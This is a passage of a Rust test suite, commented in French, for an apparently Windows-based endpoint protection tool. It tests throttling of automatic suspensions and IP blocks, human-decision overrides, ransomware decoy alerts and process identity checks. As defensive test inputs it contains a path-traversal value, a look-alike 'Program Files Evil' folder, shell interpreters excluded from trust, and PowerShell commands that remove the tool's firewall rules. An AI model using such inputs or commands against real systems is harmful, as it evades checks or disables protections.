    for (i, t) in [S0 + 200_000, S0 + 204_000, S0 + 208_000].iter().enumerate() {
        assert_eq!(h.examiner(Suspension, r"C:\Mal.exe", *t, &mut sans_empreinte), Passage::Passe, "{i}");
        h.noter(Suspension, r"C:\Mal.exe", *t);
    }
    assert!(matches!(h.examiner(Suspension, r"C:\Mal.exe", S0 + 212_000, &mut sans_empreinte), Passage::Retenue { alerte: Some(_), .. }), "plus de 24 h après la première alerte");
}

#[test]
fn garde_plafond_global_suspend_une_heure() {
    use crate::politique::{Genre::*, Historique, Passage};
    let genre = BlocageListe;
    let mut h = Historique::default();
    for i in 0..30usize {
        let c = format!("c{i}");
        assert_eq!(h.examiner(genre, &c, S0 + i as u64, &mut sans_empreinte), Passage::Passe, "{i}");
        h.noter(genre, &c, S0 + i as u64);
    }
    let t = S0 + 30;
    assert!(matches!(h.examiner(genre, "suivante", t, &mut sans_empreinte), Passage::Retenue { alerte: Some(_), .. }), "au plafond");
    assert!(matches!(h.examiner(genre, "autre", t + 1, &mut sans_empreinte), Passage::Retenue { alerte: None, .. }), "une seule alerte");
    assert!(matches!(h.examiner(genre, "autre", t + 3599, &mut sans_empreinte), Passage::Retenue { .. }), "encore en pause");
    assert_eq!(h.examiner(genre, "autre", t + 3600, &mut sans_empreinte), Passage::Passe, "une heure après");
    assert_eq!(h.examiner(Suspension, "autre", t + 1, &mut sans_empreinte), Passage::Passe, "la pause ne touche pas les suspensions");
    assert_eq!(h.examiner(BlocageIps, "autre", t + 1, &mut sans_empreinte), Passage::Passe, "ni l'IPS");
}

/// Décision du mainteneur (audit de #110, S110-01) : aucun plafond global sur les suspensions, un programme jetable ne doit
/// pas pouvoir retirer sa place à un rançongiciel. Seul le seuil par programme demeure
#[test]
fn garde_suspensions_sans_plafond_global() {
    use crate::politique::{Genre::*, Historique, Passage};
    let mut h = Historique::default();
    for i in 0..200u64 {
        let c = format!(r"C:\jetable{i}.exe");
        assert_eq!(h.examiner(Suspension, &c, S0 + i, &mut sans_empreinte), Passage::Passe, "{i}");
        h.noter(Suspension, &c, S0 + i);
    }
    assert_eq!(h.examiner(Suspension, r"C:\rancon.exe", S0 + 200, &mut sans_empreinte), Passage::Passe);
}

#[test]
fn garde_ips_cinquante_adresses_par_heure() {
    use crate::politique::{Genre::*, Historique, Passage};
    let mut h = Historique::default();
    for i in 0..50u64 {
        let c = format!("203.0.113.{i}");
        assert_eq!(h.examiner(BlocageIps, &c, S0 + i, &mut sans_empreinte), Passage::Passe, "{i}");
        h.noter(BlocageIps, &c, S0 + i);
    }
    assert!(matches!(h.examiner(BlocageIps, "198.51.100.1", S0 + 50, &mut sans_empreinte), Passage::Retenue { alerte: Some(_), .. }), "51e adresse");
    assert!(matches!(h.examiner(BlocageIps, "198.51.100.2", S0 + 51, &mut sans_empreinte), Passage::Retenue { alerte: None, .. }), "une alerte par heure");
    assert_eq!(h.examiner(BlocageIps, "203.0.113.1", S0 + 52, &mut sans_empreinte), Passage::Passe, "adresse déjà comptée");
    assert_eq!(h.examiner(BlocageListe, "198.51.100.1", S0 + 52, &mut sans_empreinte), Passage::Passe, "compteur à part des listes");
    assert_eq!(h.examiner(BlocageIps, "198.51.100.3", S0 + 3700, &mut sans_empreinte), Passage::Passe, "la fenêtre glisse");
}

#[test]
fn garde_decision_humaine_prime_sept_jours() {
    use crate::politique::{Genre::*, Historique, Passage};
    let mut h = Historique::default();
    h.decision_humaine("203.0.113.5", None, S0);
    assert!(matches!(h.examiner(BlocageListe, "203.0.113.5", S0 + 1, &mut sans_empreinte), Passage::Retenue { alerte: None, .. }));
    assert!(matches!(h.examiner(BlocageIps, "203.0.113.5", S0 + 604_799, &mut sans_empreinte), Passage::Retenue { .. }));
    assert_eq!(h.examiner(BlocageListe, "203.0.113.5", S0 + 604_800, &mut sans_empreinte), Passage::Passe, "7 jours après");
    assert_eq!(h.examiner(BlocageListe, "203.0.113.6", S0 + 1, &mut sans_empreinte), Passage::Passe);
    // Programme : le même fichier seulement (D6-2)
    h.decision_humaine(r"C:\Prog.exe", Some("aa".into()), S0);
    let mut meme = || Some("aa".to_string());
    let mut autre = || Some("bb".to_string());
    assert!(matches!(h.examiner(Suspension, r"c:\prog.exe", S0 + 1, &mut meme), Passage::Retenue { .. }));
    assert_eq!(h.examiner(Suspension, r"C:\Prog.exe", S0 + 1, &mut autre), Passage::Passe, "fichier remplacé");
    assert_eq!(h.examiner(Suspension, r"C:\Prog.exe", S0 + 1, &mut sans_empreinte), Passage::Passe, "empreinte illisible : pas d'exception");
    // L'empreinte n'est lue que si une décision porte sur ce chemin
    let mut lue = false;
    let _ = h.examiner(Suspension, r"C:\Sans.exe", S0 + 1, &mut || { lue = true; None });
    assert!(!lue);
    // Une nouvelle décision remplace l'ancienne
    h.decision_humaine(r"C:\Prog.exe", Some("bb".into()), S0 + 2);
    assert_eq!(h.humaines.iter().filter(|x| x.cible == r"c:\prog.exe").count(), 1);
    assert!(matches!(h.examiner(Suspension, r"C:\Prog.exe", S0 + 3, &mut autre), Passage::Retenue { .. }));
}

#[test]
fn garde_historique_borne() {
    use crate::politique::{Genre::*, Historique};
    let mut h = Historique::default();
    for i in 0..5000u64 {
        h.noter(BlocageListe, &format!("c{i}"), S0 + i);
    }
    assert!(h.traces.len() <= 2000, "{}", h.traces.len());
    for i in 0..1000u64 {
        h.decision_humaine(&format!("d{i}"), None, S0);
    }
    assert!(h.humaines.len() <= 500, "{}", h.humaines.len());
    // Une trace de blocage part après 24 h, une trace de suspension reste 7 jours
    let mut h = Historique::default();
    h.noter(BlocageListe, "b", S0);
    h.noter(Suspension, r"C:\P.exe", S0);
    h.noter(BlocageListe, "c", S0 + 86_401);
    assert!(!h.traces.iter().any(|x| x.cible == "b"));
    assert!(h.suspendu_automatiquement(r"c:\p.exe", S0 + 604_799));
    assert!(!h.suspendu_automatiquement(r"c:\p.exe", S0 + 604_800));
    assert!(!h.suspendu_automatiquement(r"c:\autre.exe", S0 + 1));
    // Une trace de blocage ne compte pas pour une reprise
    let mut h = Historique::default();
    h.noter(BlocageListe, r"c:\p.exe", S0);
    assert!(!h.suspendu_automatiquement(r"c:\p.exe", S0 + 1));
}

/// Historique illisible : aucune action automatique. Protection en échec : la lecture refusée ne dit rien du fichier
#[test]
fn garde_historique_illisible_echec_ferme() {
    use crate::politique::{etat_initial_test as e, passages_test as p, Historique, Passage};
    assert_eq!(e(None), (false, 0), "fichier absent, tenu ouvert, ou protection en échec : la réponse reste (S110-03, D6-10)");
    assert_eq!(e(Some("{mal forme")), (true, 0), "mal formé");
    let mut h = Historique::default();
    h.noter(crate::politique::Genre::Suspension, "a", S0);
    assert_eq!(e(Some(&serde_json::to_string(&h).unwrap())), (false, 1));
    // À l'usage : aucune action automatique, une seule alerte (relecture de #110, F6)
    let (a, b) = p(Some("{mal forme"));
    assert!(matches!(a, Passage::Retenue { alerte: Some(_), .. }), "{a:?}");
    assert!(matches!(b, Passage::Retenue { alerte: None, .. }), "{b:?}");
    assert_eq!(p(None).0, Passage::Passe, "lecture refusée : la garde repart en mémoire");
    assert_eq!(p(Some("{}")).0, Passage::Passe);
    let h: Historique = serde_json::from_str(&serde_json::to_string(&{ let mut x = Historique::default(); x.noter(crate::politique::Genre::BlocageIps, "c", S0); x.decision_humaine("d", Some("e".into()), S0); x }).unwrap()).unwrap();
    assert_eq!((h.traces.len(), h.humaines.len()), (1, 1), "aller-retour");
    assert!(serde_json::to_string(&h).unwrap().contains("\"Traces\""), "noms du format");
    torturer_texte(r#"{"Traces":[{"T":1,"Genre":"Suspension","Cible":"c"}],"Humaines":[{"Cible":"c","Empreinte":null,"Jusqua":2}],"PauseListes":1}"#, &mut |t| { let _ = serde_json::from_str::<Historique>(t); });
}

/// Aucun module n'appelle une action de réponse sans passer par `execution` ; la décision est appelée dans chaque chemin
#[test]
fn structure_aucun_appel_direct_aux_actions() {
    let dossier = concat!(env!("CARGO_MANIFEST_DIR"), "/src");
    let mut lus = 0;
    for f in std::fs::read_dir(dossier).unwrap().map(|e| e.unwrap().path()) {
        let nom = f.file_name().unwrap().to_string_lossy().to_string();
        if !nom.ends_with(".rs") || ["execution.rs", "tests.rs", "tests_detection.rs"].contains(&nom.as_str()) {
            continue;
        }
        lus += 1;
        let s = std::fs::read_to_string(&f).unwrap();
        for appel in ["reponse::tuer(", "reponse::suspendre(", "reponse::isoler_programme(", "reponse::panique(", "blocage::ajouter_regle("] {
            assert!(!s.contains(appel), "{nom} appelle {appel}");
        }
    }
    assert!(lus > 30, "{lus} modules lus");
    let m = include_str!("moniteur.rs").replace("\r\n", "\n");
    assert!(m.contains("self.bloquer_ip_auto(&a, Genre::BlocageListe, ip,"), "listes");
    assert!(m.contains("politique::decider(Action::BloquerIp, Declencheur::Automatique(SourceAuto::Ips), &contexte)"), "IPS : décision en aval de l'IDS");
    assert!(m.contains("politique::passer(Genre::BlocageIps, &ip,"), "IPS : garde");
    assert!(m.contains("politique::passer(Genre::BlocageListe, ip,"), "listes : garde");
    assert!(m.contains("politique::noter(genre, ip);"), "traces");
    assert!(m.contains("if r.ok && humaine {\n                    politique::decision_humaine(cible, None);"), "déblocage");
    assert!(m.contains("decidee == Action::Reprendre && politique::suspendu_automatiquement(&chemin)"), "reprise");
    let v = include_str!("vol_donnees.rs").replace("\r\n", "\n");
    assert!(v.contains("politique::decider(Action::Suspendre, Declencheur::Automatique(SourceAuto::Leurre), &contexte)"), "leurre");
    assert!(v.contains("politique::passer(genre_leurre(pid, programme), programme,"), "leurre : garde");
    let (chemin_lu, signature_lue) = (v.find("if !crate::politique::installe_dans(programme, &dossiers)").unwrap(), v.find("crate::natif::signataire_a_echeance(programme), Ok(Some(_))").unwrap());
    assert!(chemin_lu < signature_lue, "S110-15");
    assert!(v.contains("matches!(crate::natif::signataire_a_echeance(programme), Ok(Some(_)))"), "signature illisible : non signé");
    assert!(v.contains("[\"ProgramFiles\", \"ProgramFiles(x86)\", \"ProgramW6432\"]"), "dossiers");
    assert!(v.contains("crate::politique::noter_suspension(&programme, crate::natif::empreinte_a_echeance(&programme).ok().flatten(), pid, creation);"), "leurre : trace, empreinte, heure de création, registre (S115-06)");
    let p = include_str!("politique.rs").replace("\r\n", "\n");
    assert!(p.contains("e.h.noter_avec(Genre::Suspension, chemin, empreinte, Some(creation), t);\n        e.h.ouvrir(Sorte::SuspensionAuto, chemin, Some(pid), Some(creation), t);\n        enregistrer(e);"), "S115-06 : une écriture");
    assert!(m.contains("politique::ouvrir(politique::Sorte::Quarantaine, c.cible.as_deref().unwrap_or(\"\"), None, None);"), "6.4b : quarantaine");
    assert_eq!(m.matches("politique::clore(&[politique::Sorte::Quarantaine], Some(&o), None, politique::EtatAction::Levee);").count(), 2, "6.4b : restauration, et repli");
    assert_eq!(m.matches("politique::ouvrir(politique::Sorte::BlocageManuel, c.ip.as_deref().unwrap_or(\"\"), None, None);").count(), 2, "6.4b : blocage d'IP, par « bloquerIp » et par « bloquer » sans domaine");
    assert!(m.contains("politique::ouvrir(politique::Sorte::BlocageManuel, n, None, None);"), "6.4b : blocage de domaine");
    assert!(m.contains("clore(&[politique::Sorte::BlocageManuel], Some(cible), None, politique::EtatAction::Levee);\n        Reponse::ok(format!(\"{cible} débloqué.\"))"), "6.4b : déblocage, clos après le succès (S116-03)");
    let (hosts_ecrit, manuels_clos) = (m.find("if let Err(e) = blocage::ecrire_bloc_hosts(&[]) {").unwrap(), m.find("politique::clore(&[politique::Sorte::BlocageManuel], None, None, politique::EtatAction::Levee);").unwrap());
    assert!(hosts_ecrit < manuels_clos, "6.4b : tout débloquer, blocages manuels clos après le fichier hosts (audit de #116)");
    assert!(m.contains("politique::clore(&[politique::Sorte::Isolation], None, None, politique::EtatAction::Levee);"), "6.4b : tout débloquer, isolations");
    assert!(m.contains("self.blocages = restants;"), "relecture de #116 : la liste en mémoire garde le blocage si hosts est refusé");
    // PR 6.5 : PowerShell du mode panique hors du verrou ; reponse::panique ne le lance plus
    let canal = include_str!("canal.rs").replace("\r\n", "\n");
    assert!(canal.contains("let prealable = crate::moniteur::preparer(&c);\n                let r = moniteur.lock().unwrap().executer(c, partage, prealable);"), "6.5 : préparé avant le verrou");
    let r = include_str!("reponse.rs").replace("\r\n", "\n");
    let corps = &r[r.find("pub fn panique(").unwrap()..];
    let corps = &corps[..corps.find("\n}\n").unwrap()];
    assert!(!corps.contains("epargnees()"), "6.5 : aucune résolution sous le verrou");
    assert!(m.contains("self.ajouter_alerte_brute(alerte_panique(activer, &e, reponse::etat_panique()), None);"), "6.5 : échec du mode panique alerté");
    assert!(m.contains("panique: reponse::etat_panique() != reponse::EtatPanique::Inactive,"), "6.5 : état effectif publié");
    assert!(m.contains("blocage::supprimer_groupe(true); //"), "relecture de #117, Q2 : tout débloquer garde le mode panique");
    assert!(m.contains("(n, blocage::supprimer_groupe_detail())"), "--nettoyer retire tout");
    let (garde, tout) = (crate::blocage::commande_suppression_groupe(true), crate::blocage::commande_suppression_groupe(false));
    assert_eq!(garde, "Get-NetFirewallRule -Group 'deR4Tizer' -ErrorAction SilentlyContinue | Where-Object { $_.DisplayName -notlike 'deR4Tizer PANIQUE (*' } | Remove-NetFirewallRule", "Q2 : filtre");
    assert_eq!(tout, "Get-NetFirewallRule -Group 'deR4Tizer' -ErrorAction SilentlyContinue | Remove-NetFirewallRule", "--nettoyer");
    assert!(m.contains("if !crate::reponse::commande_panique_en_cours() {\n                        let generation = crate::reponse::generation_panique();"), "P1 : alerte au passage à incertaine, hors d'une commande (audit de #117)");
    assert!(m.contains("&& crate::reponse::lecture_publiable(generation, crate::reponse::generation_panique(), crate::reponse::commande_panique_en_cours())"), "relecture de #118 : commande commencée et finie pendant la lecture");
    // B1 (relecture de #119) : le premier relevé est vu par le bloc du mode panique, et n'est quitté qu'après lui
    let f = &m[m.find("let mut premier_releve = true;").expect("premier_releve")..];
    let (lu, alerte, fin) = (f.find("let avant = etat_avant_releve(premier_releve, crate::reponse::etat_panique());").unwrap(),
        f.find("m.lock().unwrap().ajouter_alerte_brute(alerte_panique_incertaine(), None);").unwrap(), f.find("premier_releve = false;").unwrap());
    assert!(lu < alerte && alerte < fin, "premier relevé : lu, alerté, puis seulement quitté");
    assert_eq!(f.matches("premier_releve = false;").count(), 1);
    // Démarrage : aucune requête au pare-feu avant que le service se déclare démarré (échecs 1920 en VM)
    let demarrer = &m[m.find("pub fn demarrer(console: bool)").unwrap()..];
    let demarrer = &demarrer[..demarrer.find("std::thread::Builder::new().name(\"sante\".into())").unwrap()];
    assert!(demarrer.contains("crate::reponse::etat_provisoire_panique();"), "état provisoire au démarrage");
    assert!(!demarrer.contains("rafraichir_etat_panique()"), "pas de lecture du pare-feu au démarrage");
    // Ni l'état du pare-feu du diagnostic d'exposition (relecture de #148, D1) : None jusqu'au premier passage
    for lecture in ["etat_parefeu_windows", "INetFwPolicy2", "politique()"] {
        assert!(!demarrer.contains(lecture), "pas de lecture du pare-feu au démarrage : {lecture}");
    }
    assert!(!demarrer.contains("relancer_lecture_parefeu"), "pas de lecture du pare-feu lancée au démarrage");
    assert!(m.contains("let chemin = match reponse::chemin_final_a_isoler(c.cible.as_deref().unwrap_or(\"\")) {"), "6.6 : isolation sur le chemin final");
    let (autorisee, ouverte) = (m.find("let a = match autorisation_humaine(Action::Isoler) {").unwrap(), m.find("let chemin = match reponse::chemin_final_a_isoler(").unwrap());
    assert!(autorisee < ouverte, "relecture de #118, R1 : autorisation avant toute ouverture");
    assert!(m.contains("if detournees_signalees.insert((cible.clone(), vers.clone())) {"), "S118-01 : revérification, une alerte par détournement");
    assert!(!m.contains("retirer_isolation_detournee"), "relecture de #118, D2 : une isolation n'est jamais levée automatiquement");
    assert!(m.contains("let (n, alerter) = compter_illisible(illisibles.get(&cible).copied().unwrap_or(0), etat == reponse::EtatIsolation::Illisible);")
        && m.contains("m.lock().unwrap().ajouter_alerte_brute(alerte_isolation_non_verifiable(&cible), None);"), "audit de #119 : illisible répété, dit");
    let bloc = &m[m.find("let etat = reponse::verifier_isolation(&cible);").unwrap()..];
    let bloc = &bloc[..bloc.find("tours = tours.wrapping_add(1);").unwrap()];
    for interdit in ["liberer_programme", "politique::clore", "blocages.retain", "debloquer"] {
        assert!(!bloc.contains(interdit), "D2 : {interdit} dans la revérification");
    }
    assert!(m.contains("                    if tours % 10 == 0 {"), "S118-01 : toutes les 5 min");
    assert!(include_str!("natif.rs").contains("let options = FILE_FLAG_OPEN_REPARSE_POINT | FILE_FLAGS_AND_ATTRIBUTES(0x0011_0000)"), "R1 : SQOS");
    let r = include_str!("reponse.rs").replace("\r\n", "\n");
    assert!(r.contains("if *actif != Some(true) {\n                    let _ = pf.0.put_FirewallEnabled(*profil, VARIANT_TRUE);"), "audit de #117 : profil illisible réactivé");
    assert!(r.contains("COMMANDE_PANIQUE.store(true, std::sync::atomic::Ordering::SeqCst);\n    let _en_cours = EnCours;\n    let p = politique()"), "drapeau posé avant toute action");
    assert!(m.contains("for a in politique::echeances(&natif::processus_actif) {"), "6.4 : relances dans le cycle, processus arrêté vu comme tel");
    assert!(m.contains("Action::Suspendre => politique::ouvrir(politique::Sorte::Suspension, &chemin, Some(pid), Some(creation)),"), "6.4 : suspension manuelle");
    assert!(m.contains("Action::Reprendre => politique::clore(&suspensions, None, Some((pid, creation)), politique::EtatAction::Levee),"), "6.4 : reprise");
    assert!(m.contains("politique::ouvrir(politique::Sorte::Isolation, &chemin, None, None);"), "6.4 : isolation");
    assert!(m.contains("clore(&[politique::Sorte::Isolation], Some(cible), None, politique::EtatAction::Levee);"), "6.4 : libération");
    assert!(m.contains("politique::ouvrir(politique::Sorte::Panique, \"poste\", None, None);"), "6.4 : panique");
    assert!(m.contains("politique::clore(&[politique::Sorte::Panique], None, None, politique::EtatAction::Levee);"), "6.4 : fin de panique");
    assert!(m.contains("Duration::from_secs(duree_blocage_auto(genre))"), "D6-4 : 24 h pour l'IPS");
    assert!(m.contains("if poser_echeances_manquantes(&mut self.blocages,"), "S109-04");
    let (poussee, notee) = (v.find("file.lock().unwrap().push(alerte);").unwrap(), v.find("crate::politique::noter_suspension(").unwrap());
    assert!(poussee < notee, "l'alerte avant l'écriture de l'historique (S110-04)");
    assert!(v.contains("if deja { (true, None) } else if tentee { suspension_leurre("), "S110-02");
    assert!(v.contains("Attendu::Leurre { avant: crate::hygiene::heure_evenement(&xml), chemin: programme.clone() }"), "6.3 : identité du leurre");
    assert!(m.contains("let attendu = reponse::Attendu::Exacte { creation };"), "6.3 : identité de la commande");
    assert!(m.contains("politique::empreinte_suspension(&chemin, creation)\n"), "S110-05, S113-06");
    // S110-06 : l'exception de 7 jours passe par `exception_permise`, avant de lire l'empreinte
    let (filtre, empreinte) = (m.find("if politique::exception_permise(&chemin, &crate::natif::dossier_windows()) {").expect("S110-06"),
        m.find("politique::empreinte_suspension(&chemin, creation)\n").unwrap());
    assert!(filtre < empreinte, "S110-06 : filtre avant l'empreinte");
    assert!(m.contains("Ok(()) if sans_exception => Reponse::ok("), "S110-06 : dit à l'administrateur");
    assert!(m.contains("if *p == pid { Some((pid, racine.clone())) }"), "relecture de #113, J1 : la racine garde l'identité montrée jusqu'à l'action");
    assert!(m.contains("if n == 0 {\n                    return Reponse::erreur(premiere_erreur.unwrap_or_else("), "P3, P5 : aucun arrêt, pas un succès, et le premier motif");
    assert!(v.contains("(false, Some(format!(\"échec : {e}\")))"), "S113-01 : l'alerte dit l'échec");
    assert!(include_str!("politique.rs").contains("e.h.noter_avec(Genre::Suspension, chemin, empreinte, Some(creation), t);"), "S113-06 : la trace porte l'heure de création");
    assert!(m.contains("if !reponse::meme_processus(&racine, natif::creation_processus(pid), \"\") {"), "6.3 : racine de la chaîne");
    assert!(m.contains("filter(|(p, i)| match execution::tuer(&a, *p, i) {"), "6.3 : descendants, identité relevée à la décision");
    assert!(v.contains("leurre_connu_garanti(chemin, &d, &|e| signe_par(chemin, e), &|c| crate::politique::ferme_en_ecriture(c, &racines), &|| crate::natif::compte_privilegie(pid) == Some(true))"), "S113-10 : dossier fermé en production, droits et compte contrôlés");
    assert!(v.contains("Passage::Passe => match crate::execution::suspendre(&a, pid, attendu, true) {"), "6.3 : le leurre passe l'identité");
    let rp = include_str!("reponse.rs").replace("\r\n", "\n");
    assert!(rp.contains("agir(pid, attendu, PROCESS_TERMINATE, true,") && rp.contains("agir(pid, attendu, PROCESS_SUSPEND_RESUME, suspendre,"), "6.3 : action par le handle, contrôle critique pour tuer et suspendre");
    assert!(rp.contains("if !meme_processus(attendu, p.creation(), &chemin) {\n        return Err(IDENTITE_CHANGEE.into());"), "6.3 : comparaison sur le handle, échec fermé");
    assert!(!rp.contains("OpenProcess(PROCESS_TERMINATE") && !rp.contains("OpenProcess(PROCESS_SUSPEND_RESUME"), "6.3 : aucune seconde ouverture");
    assert!(v.contains("dire_retenue(&mut alerte, &r);"), "F6 : l'alerte dit la retenue");
    // Relecture de #110, P3 : un chemin humain de plus se voit ici
    let humains: usize = [("moniteur", m.as_str()), ("vol_donnees", v.as_str())].iter().map(|(_, s)| s.matches("Declencheur::Humain").count()).sum();
    assert_eq!(humains, 1, "autorisation_humaine seulement");
    assert_eq!(include_str!("main.rs").matches("Declencheur::Humain").count(), 1, "--test-reponse");
    assert!(m.contains("self.ajouter_alerte_action(crate::regles::RES_001, \"Critique\", &f, format!(\"{}{action}\", f.raisons), bloquee);"), "F1");
    assert!(m.contains("bloquee = true;"), "F1");
    assert_eq!(m.matches("if politique::retenue_a_journaliser(&mut self.retenues_siem,").count(), 2, "F2 : listes et IPS");
    assert!(!include_str!("ids.rs").contains("politique::"), "IDS gelé");
    assert!(!include_str!("politique.rs").contains("pause_suspensions"), "décision du mainteneur");
    // Relecture de #109, P7 : le chargement calcule bien le critère de levée
    assert!(include_str!("menaces.rs").contains("m.niveau3_complet = niveau3_complet(&infos.sources);"));
}

#[test]
fn blocage_pose_automatiquement_seulement_par_le_service() {
    use crate::commun::Blocage;
    use crate::moniteur::blocage_pose_automatiquement as auto;
    let b = |t: &str, r: &str, e: &str| Blocage { type_: t.into(), cible: "c".into(), raison: r.into(), date: String::new(), expire: e.into() };
    assert!(auto(&b("parefeu", "blocage automatique : Feodo", "2099-01-01 00:00:00")));
    assert!(auto(&b("parefeu", "blocage automatique : Feodo", "")), "échéance non écrite");
    assert!(auto(&b("parefeu", "IPS : règle 9", "2099-01-01 00:00:00")), "IPS");
    assert!(!auto(&b("parefeu", "blocage manuel", "")));
    assert!(!auto(&b("programme", "blocage automatique", "x")), "autre type");
}

/// Relecture de #110, F1 : un blocage différé par la garde a sa propre alerte, le reste garde sa clé
#[test]
fn garde_blocage_differe_a_son_alerte() {
    use crate::moniteur::cle_flux as c;
    assert_ne!(c("Critique", "p", "n", "1.2.3.4", true), c("Critique", "p", "n", "1.2.3.4", false));
    assert_eq!(c("Critique", "p", "n", "1.2.3.4", false), "Critique|p|n|1.2.3.4", "clé inchangée sans action");
}

/// Relecture de #110, F2 : une ligne par cible et par motif et par heure, mémoire bornée
#[test]
fn garde_retenue_journalisee_une_fois_par_heure() {
    use crate::politique::retenue_a_journaliser as j;
    let mut v = std::collections::HashMap::new();
    assert!(j(&mut v, "a", S0));
    assert!(!j(&mut v, "a", S0 + 3599));
    assert!(j(&mut v, "b", S0 + 1), "une autre cible ou un autre motif");
    assert!(j(&mut v, "a", S0 + 3600), "une heure après");
    for i in 0..5000 {
        j(&mut v, &format!("x{i}"), S0 + 3600);
    }
    assert!(v.len() <= 500, "{}", v.len());
    // Relecture de #110, H1 : table pleine de cibles récentes, aucune ligne de plus à chaque cycle
    let mut v = std::collections::HashMap::new();
    let lignes: usize = (0..20u64).map(|c| (0..600).filter(|i| j(&mut v, &format!("c{i}"), S0 + c * 5)).count()).sum();
    assert!(lignes <= 500, "{lignes}");
    assert!(j(&mut v, "nouvelle", S0 + 3600), "une heure après, la table se vide");
}

/// Décision du mainteneur (audit de #110, S110-11) : seuil pour un programme signé installé dans Program Files seulement
#[test]
fn garde_seuil_seulement_pour_program_files() {
    use crate::politique::{genre_suspension as g, Genre::*, Historique, Passage};
    let d = [r"C:\Program Files".to_string(), r"C:\Program Files (x86)\".to_string()];
    assert_eq!(g(r"C:\Program Files\Editeur\app.exe", true, &d), Suspension);
    assert_eq!(g(r"c:\program files (x86)\editeur\APP.EXE", true, &d), Suspension, "sans la casse, barre finale tolérée");
    assert_eq!(g(r"C:\Program Files\Editeur\app.exe", false, &d), SuspensionSansSeuil, "non signé");
    assert_eq!(g(r"C:\Users\x\app.exe", true, &d), SuspensionSansSeuil, "profil");
    assert_eq!(g(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", true, &d), SuspensionSansSeuil, "binaire Windows");
    assert_eq!(g(r"C:\Program Files\PowerShell\7\pwsh.exe", true, &d), SuspensionSansSeuil, "interpréteur installé");
    assert_eq!(g(r"C:\Program Files\Python\PYTHON.EXE", true, &d), SuspensionSansSeuil, "sans la casse");
    assert_eq!(g(r"C:\Program Files Evil\app.exe", true, &d), SuspensionSansSeuil, "dossier voisin");
    assert_eq!(g(r"C:\Program Files\..\Users\x\app.exe", true, &d), SuspensionSansSeuil, "remontée");
    assert_eq!(g(r"C:\Program Files\app.exe", true, &[String::new()]), SuspensionSansSeuil, "variable vide");
    assert_eq!(g(r"\\serveur\partage\app.exe", true, &[String::new()]), SuspensionSansSeuil, "variable vide, chemin réseau");
    assert_eq!(g(r"C:\Program Files\Editeur\mypython.exe", true, &d), Suspension, "le nom entier, pas une partie");
    // Sans seuil : la 4e, la 100e passent ; la décision humaine reste, et les traces comptent pour une reprise
    let mut h = Historique::default();
    for i in 0..100u64 {
        assert_eq!(h.examiner(SuspensionSansSeuil, r"C:\m.exe", S0 + i * 4000, &mut sans_empreinte), Passage::Passe, "{i}");
        h.noter(Suspension, r"C:\m.exe", S0 + i * 4000);
    }
    assert!(h.suspendu_automatiquement(r"C:\m.exe", S0 + 396_000));
    h.decision_humaine(r"C:\m.exe", Some("aa".into()), S0 + 400_000);
    let mut meme = || Some("aa".to_string());
    assert!(matches!(h.examiner(SuspensionSansSeuil, r"C:\m.exe", S0 + 400_001, &mut meme), Passage::Retenue { .. }), "décision humaine");
}

/// Relecture de #110, P7 : un BOM, tel qu'un éditeur en ajoute, ne coupe pas la réponse
#[test]
fn garde_historique_avec_bom() {
    use crate::politique::etat_initial_test as e;
    assert_eq!(e(Some("\u{feff}{}")), (false, 0));
}

/// Audit de #110, S110-02 : un même processus ne consomme qu'une place, un PID réutilisé repasse par la garde
#[test]
fn garde_processus_deja_suspendu() {
    use crate::vol_donnees::deja_suspendu as d;
    use std::time::{Duration, Instant};
    let mut m = std::collections::HashMap::new();
    let t = Instant::now();
    assert!(!d(&mut m, 7, 100, t));
    m.insert(7, (100, t));
    assert!(d(&mut m, 7, 100, t + Duration::from_secs(59)), "même processus, événements en file");
    assert!(!d(&mut m, 7, 101, t + Duration::from_secs(1)), "PID réutilisé");
    assert!(!d(&mut m, 8, 100, t + Duration::from_secs(1)), "un autre PID");
    assert!(!d(&mut m, 7, 100, t + Duration::from_secs(60)), "une minute après, après une reprise par exemple");
    assert!(m.is_empty(), "mémoire bornée");
}

/// Relecture de #110, F6 : l'alerte dit la retenue, et sa clé diffère de celle de l'alerte « suspendu » du même programme
#[test]
fn garde_alerte_leurre_dit_la_retenue() {
    use crate::vol_donnees::{alerte_leurre_touche as a, dire_retenue};
    let long = format!(r"C:\Users\{}\mal.exe", "x".repeat(80));
    let s = a(7, &long, "leurre.docx", false, true);
    let mut r = a(7, &long, "leurre.docx", false, false);
    assert_eq!(r.niveau, "Critique");
    dire_retenue(&mut r, "motif");
    assert!(r.raisons.starts_with("Suspension automatique non faite (motif)"), "{}", r.raisons);
    assert!(r.raisons.contains("RANÇONGICIEL PROBABLE"), "l'alerte d'origine reste");
    assert_ne!(s.raisons.chars().take(40).collect::<String>(), r.raisons.chars().take(40).collect::<String>(), "clé de déduplication");
}

#[test]
fn garde_empreinte_lue_seulement_si_utile() {
    use crate::politique::{empreinte_utile_test as u, Historique};
    let mut h = Historique::default();
    assert!(!u(&h, r"C:\P.exe", S0));
    h.decision_humaine(r"C:\P.exe", Some("aa".into()), S0);
    h.decision_humaine("203.0.113.5", None, S0);
    assert!(u(&h, r"c:\p.exe", S0 + 1));
    assert!(!u(&h, "203.0.113.5", S0 + 1), "adresse : pas d'empreinte");
    assert!(!u(&h, r"C:\P.exe", S0 + 604_800), "échue");
}

// ------------------------------------------------------------ phase 6, PR 6.3 : identité revalidée

#[test]
fn identite_heure_de_creation_differente_refusee() {
    use crate::reponse::{meme_processus as m, Attendu::*};
    let a = Exacte { creation: 100 };
    assert!(m(&a, Some(100), r"C:\P.exe"));
    assert!(!m(&a, Some(101), r"C:\P.exe"), "PID réutilisé");
    assert!(!m(&a, Some(99), r"C:\P.exe"));
    assert!(!m(&a, None, r"C:\P.exe"), "heure illisible");
}

/// Décision du mainteneur (audit de #113, S113-01, S113-02) : un programme renommé, ou à chemin illisible, reste visé
#[test]
fn identite_chemin_montre_pas_compare() {
    use crate::reponse::{meme_processus as m, Attendu::*};
    assert!(m(&Exacte { creation: 100 }, Some(100), r"C:\Autre.exe"), "renommé");
    assert!(m(&Exacte { creation: 100 }, Some(100), ""), "chemin illisible");
    let l = Leurre { avant: Some(100), chemin: r"C:\P.exe".into() };
    assert!(m(&l, Some(50), r"C:\Autre.exe"), "renommé avant de toucher le leurre");
    assert!(m(&l, Some(50), ""), "chemin de plus de 1 024 caractères");
}

#[test]
fn identite_leurre_processus_cree_apres_l_evenement_refuse() {
    use crate::reponse::{meme_processus as m, Attendu::*};
    let a = Leurre { avant: Some(100), chemin: r"C:\P.exe".into() };
